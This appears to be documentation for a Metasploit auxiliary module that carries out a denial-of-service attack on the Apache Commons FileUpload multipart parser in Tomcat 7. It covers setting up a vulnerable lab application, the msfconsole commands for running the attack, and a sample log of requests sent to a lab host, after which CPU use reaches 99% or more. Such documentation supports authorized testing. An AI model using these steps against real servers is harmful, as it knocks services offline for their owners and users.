## Vulnerable Application

1. Download and install the pre-req [Java7](http://www.oracle.com/technetwork/java/javase/downloads/jre7-downloads-1880261.html)
2. Download and install [Tomcat7](http://apache.osuosl.org/tomcat/tomcat-7/v7.0.50/bin/apache-tomcat-7.0.50.exe)
3. Download the example [multipart form war file](https://github.com/rapid7/metasploit-framework/files/712278/sample-multipart-form.zip)
4. Unzip sample-multipart-form.zip && cd sample-multipart-form
  1. If Compiling: `mvn clean package`
5.  `cp target/sample-multipart-form.war $TOMCAT-7.0.50/webapps/`
6. Start Tomcat (linux: `$TOMCAT-7.0.50/bin/startup.sh`)
7. Check if the webapp is running: `http://localhost:8080/sample-multipart-form/multipartForm`

## Verification Steps

  1. Install Tomcat, and the vulnerable form
  2. Start msfconsole
  3. Do: ```use auxiliary/dos/http/apache_commons_fileupload_dos```
  4. Do: ```set rhost <rhost>```
  5. Do: ```set TARGETURI <uri>```
  6. Do: ```run```
  7. Tomcat should be utilizing 99%+ of the CPU

## Options

  **TARGETURI**

  The URI where the multipart form is located.  There is no real default and this will change based on the application.

## Scenarios

Scenario uses the sample multipart form provided in this documentation, against Tomcat 7.0.50 on a Windows XP system.

```
msf exploit(handler) > use auxiliary/dos/http/apache_commons_fileupload_dos
msf auxiliary(apache_commons_fileupload_dos) > set rhost 192.168.2.108
rhost => 192.168.2.108
msf auxiliary(apache_commons_fileupload_dos) > set rport 8087
rport => 8087
msf auxiliary(apache_commons_fileupload_dos) > set TARGETURI /sample-multipart-form/multipartForm
TARGETURI => /sample-multipart-form/multipartForm
msf auxiliary(apache_commons_fileupload_dos) > run

[*] Sending request 1 to 192.168.2.108:8087
[*] Sending request 2 to 192.168.2.108:8087
[*] Sending request 3 to 192.168.2.108:8087
[*] Sending request 4 to 192.168.2.108:8087
[*] Sending request 5 to 192.168.2.108:8087
[*] Sending request 6 to 192.168.2.108:8087
[*] Sending request 7 to 192.168.2.108:8087
[*] Sending request 8 to 192.168.2.108:8087
[*] Sending request 9 to 192.168.2.108:8087
[*] Sending request 10 to 192.168.2.108:8087
[*] Sending request 11 to 192.168.2.108:8087
[*] Sending request 12 to 192.168.2.108:8087
[*] Sending request 13 to 192.168.2.108:8087
[*] Sending request 14 to 192.168.2.108:8087
[*] Sending request 15 to 192.168.2.108:8087
[*] Sending request 16 to 192.168.2.108:8087
[*] Sending request 17 to 192.168.2.108:8087
[*] Sending request 18 to 192.168.2.108:8087
[*] Sending request 19 to 192.168.2.108:8087
[*] Sending request 20 to 192.168.2.108:8087
[*] Sending request 21 to 192.168.2.108:8087
[*] Sending request 22 to 192.168.2.108:8087
[*] Sending request 23 to 192.168.2.108:8087
[*] Sending request 24 to 192.168.2.108:8087
[*] Sending request 25 to 192.168.2.108:8087
[*] Sending request 26 to 192.168.2.108:8087
[*] Sending request 27 to 192.168.2.108:8087
[*] Sending request 28 to 192.168.2.108:8087
[*] Sending request 29 to 192.168.2.108:8087
[*] Sending request 30 to 192.168.2.108:8087
[*] Sending request 31 to 192.168.2.108:8087
[*] Sending request 32 to 192.168.2.108:8087
[*] Sending request 33 to 192.168.2.108:8087
[*] Sending request 34 to 192.168.2.108:8087
[*] Sending request 35 to 192.168.2.108:8087
[*] Sending request 36 to 192.168.2.108:8087
[*] Sending request 37 to 192.168.2.108:8087
[*] Sending request 38 to 192.168.2.108:8087
[*] Sending request 39 to 192.168.2.108:8087
[*] Sending request 40 to 192.168.2.108:8087
[*] Sending request 41 to 192.168.2.108:8087
[*] Sending request 42 to 192.168.2.108:8087
[*] Sending request 43 to 192.168.2.108:8087
[*] Sending request 44 to 192.168.2.108:8087
[*] Sending request 45 to 192.168.2.108:8087
[*] Sending request 46 to 192.168.2.108:8087
[*] Sending request 47 to 192.168.2.108:8087
[*] Sending request 48 to 192.168.2.108:8087
[*] Sending request 49 to 192.168.2.108:8087
[*] Sending request 50 to 192.168.2.108:8087
[*] Auxiliary module execution completed
```

 ![tomcat7_dos](https://cloud.githubusercontent.com/assets/752491/22169486/71980e2e-df42-11e6-8353-4f1e260375ee.png)
 